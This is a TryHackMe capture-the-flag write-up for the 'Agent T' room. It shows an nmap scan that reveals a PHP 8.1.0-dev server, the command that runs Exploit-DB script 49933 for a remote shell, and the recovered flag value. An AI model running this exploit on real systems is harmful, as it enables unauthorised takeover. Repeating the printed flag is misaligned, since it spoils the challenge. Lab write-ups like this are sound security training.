---
title: "TryHackMe - Agent T"
date: 2025-05-09 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [ExploitDB, rce , PHP 8.1.0-dev, web exploitation ]
---


## Introduction
In this post, I document the solution to the Agent T room on TryHackMe. This challenge focuses on identifying and exploiting a remote code execution (RCE) vulnerability in a PHP-based HTTP server. Below is a detailed breakdown of my approach.

## Reconnaissance

I began with a full port scan using Nmap, including service and version detection:

```console 
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -T4 -p- -A 10.10.193.148 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 10:07 EDT
Nmap scan report for 10.10.193.148
Host is up (0.066s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   64.28 ms 10.23.0.1
2   64.44 ms 10.10.193.148

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.09 seconds
```

Results:
- Open port: 80/tcp

- Service: PHP CLI Server 5.5 or later (PHP 8.1.0-dev)

- Page title: Admin Dashboard

- Operating system: Linux (version 4.15 - 5.19)

The presence of `PHP 8.1.0-dev` stood out due to a known remote code execution vulnerability.

## Exploiting a Known Vulnerability (ExploitDB)

The version `PHP 8.1.0-dev` is affected by a public RCE vulnerability available at Exploit-DB [(ID 49933)](https://www.exploit-db.com/exploits/49933).

I ran the provided Python script against the target:

```console
python3 49933.py 
http://10.10.193.148
```

This resulted in remote shell access to the target system.


## Locating the Flag

With shell access established, I searched for the flag:

```console
$ find / -type f -name "flag.txt"
/flag.txt

$ cat /flag.txt
flag{4127d0530abf16d6d23973e3df8dbecb}
$ 
```

## Conslusion

The Agent T challenge demonstrates the critical importance of avoiding unstable development versions in production. The use of PHP 8.1.0-dev exposed the system to complete takeover via a publicly available RCE exploit.